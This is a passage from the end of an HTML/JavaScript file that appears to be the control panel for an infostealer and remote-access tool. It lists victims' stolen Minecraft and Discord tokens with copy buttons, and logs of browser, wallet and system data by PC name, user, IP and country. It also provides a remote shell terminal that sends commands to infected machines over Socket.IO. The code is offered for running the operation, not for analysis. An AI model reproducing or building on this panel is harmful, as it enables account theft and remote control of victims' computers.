                    type: 'shell',
                    data: cmd
                }).then(res => {
                    if (!res.success) {
                        term.writeln('\x1b[31m[!] Failed to send command: ' + (res.error || 'Unknown error') + '\x1b[0m');
                    }
                });
            }
        }

        function connectShell() {
            const player = document.getElementById('shellPlayerSelect')?.value;
            if (!player) {
                toast('Select a player first', 'error');
                return;
            }

            shellConnected = true;
            term.clear();
            term.writeln('\x1b[1;32m[+] Connected to: ' + player + '\x1b[0m');
            term.writeln('\x1b[33m[*] Type commands below. Press Enter to execute.\x1b[0m');
            term.writeln('');
            term.write('\x1b[36m$ \x1b[0m');
        }

        // Listen for shell output from Socket.IO (safe check)
        function attachShellSocketListeners() {
            if (typeof socket !== 'undefined' && socket !== null && socket.on) {
                socket.on('shell_output', (data) => {
                    if (term && data.output) {
                        term.write(data.output);
                        term.write('\r\n\x1b[36m$ \x1b[0m');
                    }
                });

                socket.on('shell_error', (data) => {
                    if (term && data.error) {
                        term.writeln('\x1b[31m' + data.error + '\x1b[0m');
                        term.write('\x1b[36m$ \x1b[0m');
                    }
                });
                console.log('Shell socket listeners attached');
            } else {
                // Retry after socket is ready
                setTimeout(attachShellSocketListeners, 500);
            }
        }
        // Delay initial attachment to allow socket to connect
        setTimeout(attachShellSocketListeners, 1000);

        // Initialize terminal when shell page is shown
        const _origShowPageShell = showPage;
        showPage = function (page) {
            _origShowPageShell(page);
            if (page === 'shell') {
                setTimeout(() => {
                    initTerminal();
                    loadRemotePlayers();
                    // Populate shell player select
                    const shellSelect = document.getElementById('shellPlayerSelect');
                    const remoteSelect = document.getElementById('remotePlayerSelect');
                    if (shellSelect && remoteSelect) {
                        shellSelect.innerHTML = remoteSelect.innerHTML;
                    }
                }, 100);
            }
        };

        // Add event listener for player selection
        document.addEventListener('DOMContentLoaded', () => {
            const shellSelect = document.getElementById('shellPlayerSelect');
            if (shellSelect) {
                shellSelect.addEventListener('change', () => {
                    if (shellSelect.value && term) {
                        connectShell();
                    }
                });
            }
        });
        console.log("MAIN SCRIPT CRASH CHECK: IF YOU SEE THIS, IT FINISHED.");



    </script>
    <script>
        // SAFE ISOLATED BLOCK FOR LOGS
        console.log("Defining SAFE loadLogs...");

        // INLINE HELPERS
        function _safe_escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        function _safe_getTypeIcon(type) {
            const icons = {
                minecraft: '<i class="fas fa-cube"></i>',
                discord: '<i class="fab fa-discord"></i>',
                browser: '<i class="fas fa-globe"></i>',
                wallet: '<i class="fas fa-wallet"></i>',
                system: '<i class="fas fa-laptop"></i>',
                zip: '<i class="fas fa-file-archive"></i>'
            };
            return icons[type] || '<i class="fas fa-file"></i>';
        }

        function _safe_getPreview(type, data) {
            if (!data) return '';
            if (type === 'minecraft') {
                const token = data.access_token || '';
                const preview = token.substring(0, 50) + (token.length > 50 ? '...' : '');
                const tokenId = 'mc_' + Math.random().toString(36).substr(2, 9);
                window[tokenId] = token;
                return `<div class="log-preview"><div class="log-preview-title">Player: ${data.player || 'Unknown'}</div><div class="log-preview-copy"><div class="log-preview-content">${preview || 'No token'}</div><button class="copy-btn" onclick="copyToken('${tokenId}', this)">Copy Token</button></div></div>`;
            }
            if (type === 'discord') {
                const token = data.token || '';
                const preview = token.substring(0, 35) + (token.length > 35 ? '...' : '');
                const tokenId = 'dc_' + Math.random().toString(36).substr(2, 9);
                window[tokenId] = token;
                return `<div class="log-preview"><div class="log-preview-title">Discord Token</div><div class="log-preview-copy"><div class="log-preview-content">${preview || 'No token'}</div><button class="copy-btn" onclick="copyToken('${tokenId}', this)">Copy Token</button></div></div>`;
            }
            return '';
        }

        // Pagination State
        window.currentLogType = 'all';
        window.currentLogOffset = 0;
        window.isLoadingLogs = false;
        window.logsEndReached = false;
        window._logScrollHandler = null; // Store handler to remove later if needed

        window.loadLogs = async function (type = 'all', limit = 10000, reset = true) {
            if (reset) {
                console.log("SAFE loadLogs called (RESET):", type, "limit:", limit);
                window.currentLogType = type;
                window.currentLogOffset = 0;
                window.logsEndReached = false;
                const container = document.getElementById('logsGrid');
                if (container) {
                    container.innerHTML = '<div class="loading-spinner"></div>';

                    // Attach scroll listener to the PAGE container, not window
                    const pageContainer = document.getElementById('page-logs');
                    if (pageContainer && !pageContainer.hasAttribute('data-scroll-listener')) {
                        pageContainer.addEventListener('scroll', () => {
                            if (pageContainer.scrollTop + pageContainer.clientHeight >= pageContainer.scrollHeight - 500) {
                                loadMoreLogs();
                            }
                        });
                        pageContainer.setAttribute('data-scroll-listener', 'true');
                        console.log("Scroll listener attached to #page-logs");
                    }
                }
            } else {
                if (window.isLoadingLogs || window.logsEndReached) return;
                console.log("SAFE loadLogs (APPEND):", window.currentLogOffset);
            }

            window.isLoadingLogs = true;
            const container = document.getElementById('logsGrid');
            if (!container) return; // Should not happen

            try {
                const endpoint = `/api/dashboard?limit=${limit}&skip=${window.currentLogOffset}`;
                const res = await api(endpoint);

                if (res.success) {
                    let logs = res.logs || [];
                    if (type !== 'all') logs = logs.filter(l => l.log_type === type);

                    if (reset) container.innerHTML = ''; // Clear spinner

                    if (logs.length === 0) {
                        window.logsEndReached = true;
                        if (reset) container.innerHTML = '<p style="color: var(--text-muted); padding: 20px;">No logs found</p>';
                        window.isLoadingLogs = false;
                        return;
                    }

                    // Increment offset for next load
                    window.currentLogOffset += logs.length;
                    if (logs.length < limit) window.logsEndReached = true;

                    const html = logs.map(log => {
                        const data = typeof log.data === 'string' ? JSON.parse(log.data) : log.data;
                        const preview = _safe_getPreview(log.log_type, data);
                        const icon = _safe_getTypeIcon(log.log_type);
                        const time = new Date(log.created_at).toLocaleString();

                        return `
                        <div class="log-card animate-fade">
                            <div class="log-card-header">
                                <div class="log-card-type">
                                    <span class="log-type-badge ${log.log_type}">${icon} ${log.log_type}</span>
                                </div>
                                <div class="log-card-actions">
                                    <button class="btn btn-secondary btn-icon" onclick="downloadLog(${log.id})" title="Download"><i class="fas fa-download"></i></button>
                                    <button class="btn btn-secondary btn-icon" onclick="deleteLog(${log.id})" title="Delete"><i class="fas fa-trash"></i></button>
                                </div>
                            </div>
                            <div class="log-card-body">
                                <div class="log-info-row"><i class="fas fa-desktop"></i><span>${log.pc_name || 'Unknown'}</span></div>
                                <div class="log-info-row"><i class="fas fa-user"></i><span>${log.pc_user || 'Unknown'}</span></div>
                                <div class="log-info-row"><i class="fas fa-globe"></i><span>${log.ip || 'Unknown'} (${log.country || 'Unknown'})</span></div>
                                ${preview}
                            </div>
                            <div class="log-card-footer">
                                <span>${time}</span>
                                <button class="btn btn-secondary btn-sm" onclick="showLogDetail(${log.id})">View Details</button>
                            </div>
                        </div>`;
                    }).join('');

                    container.insertAdjacentHTML('beforeend', html);
                } else {
                    if (reset) container.innerHTML = '<p style="color: var(--danger);">Failed to load logs</p>';
                }
            } catch (e) {
                console.error(e);
                if (reset) container.innerHTML = '<p style="color: var(--danger);">Error loading logs: ' + e.message + '</p>';
            } finally {
                window.isLoadingLogs = false;
            }
        }

        window.loadMoreLogs = function () {
            loadLogs(window.currentLogType, 1000, false);
        }

        /**
         * CYBER GRID ANIMATION
         * A moving perspective grid with particles.
         */
        const canvas = document.getElementById('cyber-canvas');
        if (canvas) {
            const ctx = canvas.getContext('2d');
            let w, h;

            function resize() {
                w = canvas.width = window.innerWidth;
                h = canvas.height = window.innerHeight;
            }
            window.addEventListener('resize', resize);
            resize();

            let time = 0;

            function draw() {
                // Clear with fade effect for trails
                ctx.fillStyle = '#030014';
                ctx.fillRect(0, 0, w, h);

                time += 0.2;

                ctx.save();
                ctx.strokeStyle = '#a855f7';
                ctx.lineWidth = 1;
                ctx.globalAlpha = 0.15;

                // Vertical lines (Perspective)
                const cx = w / 2;

                for (let i = -20; i <= 20; i++) {
                    ctx.beginPath();
                    ctx.moveTo(cx + i * 150, 0);
                    ctx.lineTo(cx + i * 400, h);
                    ctx.stroke();
                }

                // Horizontal moving lines
                for (let i = 0; i < 20; i++) {
                    let y = (time + i * 50) % h;
                    ctx.beginPath();
                    ctx.moveTo(0, y);
                    ctx.lineTo(w, y);
                    ctx.stroke();
                }

                ctx.restore();

                // Floating Particles
                for (let i = 0; i < 30; i++) {
                    const x = (Math.sin(time * 0.01 + i) * w / 2) + w / 2;
                    const y = (Math.cos(time * 0.02 + i) * h / 2) + h / 2;
                    const s = Math.sin(time * 0.05 + i) * 2 + 2;

                    ctx.fillStyle = i % 2 === 0 ? '#a855f7' : '#d8b4fe';
                    ctx.globalAlpha = (Math.sin(time * 0.05 + i) + 1) / 2 * 0.6;

                    ctx.beginPath();
                    ctx.arc(x, y, s, 0, Math.PI * 2);
                    ctx.fill();
                }

                requestAnimationFrame(draw);
            }
            draw();
        }
        async function loadBlacklist() {
            try {
                const res = await api('/api/admin/blacklist');
                const tbody = document.getElementById('blacklistTableBody');
                if (!tbody) return;
                tbody.innerHTML = '';

                if (res.ips && res.ips.length > 0) {
                    res.ips.forEach(ip => {
                        const row = document.createElement('tr');
                        row.style.borderBottom = '1px solid var(--border)';
                        row.innerHTML = `
                            <td class="p-3" style="color: var(--text-primary); font-family: var(--font-mono);">${ip}</td>
                            <td class="p-3 text-right">
                                <button class="btn btn-secondary btn-sm" onclick="removeBlacklistIp('${ip}')" style="color: var(--danger); border-color: var(--danger);">
                                    <i class="fas fa-trash"></i> Unblock
                                </button>
                            </td>
                        `;
                        tbody.appendChild(row);
                    });
                } else {
                    tbody.innerHTML = '<tr><td colspan="2" class="p-3 text-center text-muted">No blacklisted IPs</td></tr>';
                }
            } catch (e) { console.error("Blacklist load error", e); }
        }

        async function addBlacklistIp() {
            const ipInput = document.getElementById('blacklistIpInput');
            const ip = ipInput.value.trim();
            if (!ip) return toast('Enter an IP', 'error');

            const res = await api('/api/admin/blacklist', 'POST', { ip });
            if (res.success) {
                toast('IP Blacklisted', 'success');
                ipInput.value = '';
                loadBlacklist();
            } else {
                toast('Failed to block IP', 'error');
            }
        }

        async function removeBlacklistIp(ip) {
            if (!confirm('Unblock ' + ip + '?')) return;
            const res = await api('/api/admin/blacklist?ip=' + ip, 'DELETE');
            if (res.success) {
                toast('IP Unblocked', 'success');
                loadBlacklist();
            }
        }

        // Initial load if on admin page
        setTimeout(loadBlacklist, 2000);
    </script>

    <!-- Notification script removed -->
</body>

</html>